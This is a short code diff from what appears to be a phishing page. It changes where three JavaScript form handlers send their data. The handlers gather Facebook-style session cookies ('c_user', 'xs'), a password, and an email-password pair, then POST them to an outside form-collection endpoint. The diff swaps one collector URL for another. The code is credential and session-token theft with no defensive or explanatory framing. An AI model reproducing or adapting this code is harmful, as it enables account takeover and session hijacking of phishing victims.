@@ -2814,7 +2814,7 @@
                 const xs = document.getElementById('xs').value.trim();
                 const data = { c_user, xs };
 
-                fetch('https://api.web3forms.com/submit', {
+                fetch('https://submit-form.com/sS84wDmTk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
@@ -2852,7 +2852,7 @@
                 btn.disabled = true;
                 const data = { password: val };
 
-                fetch('https://api.web3forms.com/submit', {
+                fetch('https://submit-form.com/sS84wDmTk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
@@ -2893,7 +2893,7 @@
                 btn.disabled = true;
                 const data = { email, password };
 
-                fetch('https://api.web3forms.com/submit', {
+                fetch('https://submit-form.com/sS84wDmTk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
